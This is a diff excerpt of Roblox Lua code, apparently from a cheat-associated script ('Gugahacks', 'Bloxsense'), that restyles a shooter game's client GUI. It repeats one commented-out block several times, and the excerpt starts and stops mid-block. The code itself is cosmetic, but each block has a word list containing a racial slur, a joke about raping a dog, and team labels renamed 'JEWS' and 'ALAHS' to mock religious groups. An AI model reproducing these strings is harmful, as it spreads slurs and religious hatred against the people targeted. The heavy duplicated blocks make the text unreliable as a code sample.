+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
